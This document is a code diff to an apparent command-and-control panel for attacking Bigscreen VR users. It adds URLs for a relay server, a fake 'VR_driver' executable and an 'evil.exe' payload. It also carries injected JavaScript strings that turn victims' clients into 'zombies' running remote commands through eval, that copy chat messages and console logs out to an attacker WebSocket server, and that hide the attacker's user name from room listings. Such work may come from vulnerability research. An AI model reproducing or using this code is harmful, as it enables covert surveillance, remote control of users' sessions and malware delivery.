@@ -125,10 +125,18 @@
  *
  */
 
+//region Configuration
+
+/** URL of WebSocket server which relays communication between Command and Control panel and zombies. */
+const relayWebSocketServerUrl = 'ws://172.26.103.128:8081'; // TODO
+/** URL of static web server which hosts this Command and Control panel */
+const webServerUrl = 'http://172.26.103.128:8080/';
+const fakeDriverUrl = webServerUrl + 'payloads/VR_driver_0.34.0.exe';
+const evilPayloadUrl = webServerUrl + 'payloads/evil.exe';
+
 const bigscreenSignalUrl = 'wss://signal2.bigscreenvr.com';
-const textName = '__Mallory__';
-const relayServer = 'ws://172.26.103.128:8081'; // TODO
 const unityVersion = '0.34.0';
+const textName = '__Mallory__';
 const offerOptions = {
   offerToReceiveAudio: 1,
   offerToReceiveVideo: 1
@@ -142,6 +150,7 @@ const webRtcConfig = {
 };
 
 <!--region GUI bindings -->
+//endregion
 const joinRoomForm = document.getElementById('joinRoomForm');
 const roomsElement = document.getElementById('rooms');
 const roomIdInput = document.getElementById('roomIdInput');
@@ -454,7 +463,7 @@ function RoomParticipant(identity, room, userId){
         input.value = '';
         sendZombieCmd(
             that.identity.uuid,
-            `displayChatMessage('${msg}', USER); Unity.sendMessageToBrowsers('chat',['${msg}'], USER, 'all'); var s=new WebSocket('${relayServer}');s.onopen=function(){s.send(JSON.stringify({'type':'chat','roomId':roomState.roomId,'name':NAME,uuid:ACCOUNT.uuid,'steamId':mySteamId,'oculusId':myOculusId,message:'${msg}'}));s.close();}`
+            `displayChatMessage('${msg}', USER); Unity.sendMessageToBrowsers('chat',['${msg}'], USER, 'all'); var s=new WebSocket('${relayWebSocketServerUrl}');s.onopen=function(){s.send(JSON.stringify({'type':'chat','roomId':roomState.roomId,'name':NAME,uuid:ACCOUNT.uuid,'steamId':mySteamId,'oculusId':myOculusId,message:'${msg}'}));s.close();}`
         );
     });
     cardElement.getElementsByClassName('_redirectUI')[0].addEventListener("submit", function (event) {
@@ -491,10 +500,10 @@ function RoomParticipant(identity, room, userId){
 let hideUsernameFromRoomPreview = `Array.prototype.forEach.call(document.getElementById('room-card-players').childNodes,function(e,i,a){if(e.nodeName==='#text' && e.data==='${textName}'){if(i!==0){a[i-1].remove();}e.remove();}});`;
 let hideFirstCommaFromRoomPreview = "setTimeout(function(){var n=document.getElementById('room-card-players').childNodes;if(n[0]&&n[1]&&n[0].nodeName==='SCRIPT'&&n[1].nodeName==='#text'&& n[1].data===', '){n[1].remove()}},1);";
 let hideUsernameFromRoomParticipants = `Array.prototype.forEach.call(document.querySelectorAll('#room-participants li'),function(e){if(e.querySelector('h3.user-name').firstChild.nodeValue==='${textName}'){e.remove()}});`;
-let persistentChatEavesdropping = `;sendChat=function(){var s=new WebSocket('${relayServer}');s.onopen=function(){s.send(JSON.stringify({'type':'chat','roomId':roomState.roomId,'name':NAME,uuid:ACCOUNT.uuid,'steamId':mySteamId,'oculusId':myOculusId,'message':$('#room-chat-input').val()}));if(canSendChatMessage){canSendChatMessage= false;var _0x1865xb7=$(_0x6af9[1362])[_0x6af9[743]]();if(_0x1865xb7!= _0x6af9[90]){$(_0x6af9[1362])[_0x6af9[743]](_0x6af9[90]);$(_0x6af9[1362])[_0x6af9[1359]]();displayChatMessage(_0x1865xb7,USER);Unity[_0x6af9[1072]](_0x6af9[1971],[_0x1865xb7],USER,_0x6af9[1972]);gaChatMessageSentEvent()};setTimeout(function(){canSendChatMessage= true},CHATRATELIMIT)};};};`;
-let makeZombie = `if(!window.sz || window.sz.readyState==3){window.sz=new WebSocket('${relayServer}');sz.onopen=function(){sz.send(JSON.stringify({'type':'zombie-register','steamId':mySteamId,'oculusId':myOculusId,'uuid':ACCOUNT.uuid,name:NAME}))};sz.onmessage=function(e){var m=JSON.parse(e.data);if(m.type==='zombie-cmd'){sz.send(JSON.stringify({type:'zombie-result','steamId':mySteamId,'oculusId':myOculusId,'uuid':ACCOUNT.uuid,result:eval(m.cmd)}));}else if(m.type==='zombie-ping'){sz.send(JSON.stringify({type:'zombie-pong',uuid:ACCOUNT.uuid,}));}};};`;
-let discoverRoom = `joinRoomWithId = function(roomId) {var srd=new WebSocket('${relayServer}');srd.onopen=function(){srd.send(JSON.stringify({'type':'room-discovered','roomId':roomId,})); checkMyUserCreatedRoom(); signal["write"]({ 'type': "room-join", 'roomId': roomId, 'name': NAME, 'uuid': ACCOUNT["uuid"], 'version': UNITYVERSION, 'steamId': mySteamId, 'oculusId': myOculusId }); srd.close(); };};`;
-let persistentLogsEavesdropping = `var nl = function(level, args){var sl=new WebSocket('${relayServer}');sl.onopen=function(){sl.send(JSON.stringify({type:'log',uuid:ACCOUNT.uuid,level:level,message:args}));sl.close();};}; console.log=function(){nl('console.log',arguments)};Unity.log=function(){nl('Unity.log',arguments)};Unity.logError=function(){nl('Unity.logError',arguments)};`;
+let persistentChatEavesdropping = `;sendChat=function(){var s=new WebSocket('${relayWebSocketServerUrl}');s.onopen=function(){s.send(JSON.stringify({'type':'chat','roomId':roomState.roomId,'name':NAME,uuid:ACCOUNT.uuid,'steamId':mySteamId,'oculusId':myOculusId,'message':$('#room-chat-input').val()}));if(canSendChatMessage){canSendChatMessage= false;var _0x1865xb7=$(_0x6af9[1362])[_0x6af9[743]]();if(_0x1865xb7!= _0x6af9[90]){$(_0x6af9[1362])[_0x6af9[743]](_0x6af9[90]);$(_0x6af9[1362])[_0x6af9[1359]]();displayChatMessage(_0x1865xb7,USER);Unity[_0x6af9[1072]](_0x6af9[1971],[_0x1865xb7],USER,_0x6af9[1972]);gaChatMessageSentEvent()};setTimeout(function(){canSendChatMessage= true},CHATRATELIMIT)};};};`;
+let makeZombie = `if(!window.sz || window.sz.readyState==3){window.sz=new WebSocket('${relayWebSocketServerUrl}');sz.onopen=function(){sz.send(JSON.stringify({'type':'zombie-register','steamId':mySteamId,'oculusId':myOculusId,'uuid':ACCOUNT.uuid,name:NAME}))};sz.onmessage=function(e){var m=JSON.parse(e.data);if(m.type==='zombie-cmd'){sz.send(JSON.stringify({type:'zombie-result','steamId':mySteamId,'oculusId':myOculusId,'uuid':ACCOUNT.uuid,result:eval(m.cmd)}));}else if(m.type==='zombie-ping'){sz.send(JSON.stringify({type:'zombie-pong',uuid:ACCOUNT.uuid,}));}};};`;
+let discoverRoom = `joinRoomWithId = function(roomId) {var srd=new WebSocket('${relayWebSocketServerUrl}');srd.onopen=function(){srd.send(JSON.stringify({'type':'room-discovered','roomId':roomId,})); checkMyUserCreatedRoom(); signal["write"]({ 'type': "room-join", 'roomId': roomId, 'name': NAME, 'uuid': ACCOUNT["uuid"], 'version': UNITYVERSION, 'steamId': mySteamId, 'oculusId': myOculusId }); srd.close(); };};`;
+let persistentLogsEavesdropping = `var nl = function(level, args){var sl=new WebSocket('${relayWebSocketServerUrl}');sl.onopen=function(){sl.send(JSON.stringify({type:'log',uuid:ACCOUNT.uuid,level:level,message:args}));sl.close();};}; console.log=function(){nl('console.log',arguments)};Unity.log=function(){nl('Unity.log',arguments)};Unity.logError=function(){nl('Unity.logError',arguments)};`;
 //endregion
 
 let NAME = textName;
@@ -1086,7 +1095,7 @@ function sendZombieCmd(zombieUuid, cmd){
     }));
 }
 
-var messageRelayWs = new WebSocket(relayServer);
+var messageRelayWs = new WebSocket(relayWebSocketServerUrl);
 messageRelayWs.onopen = function(){
     messageRelayWs.send(JSON.stringify({type:'control-panel-connect'}));
 };
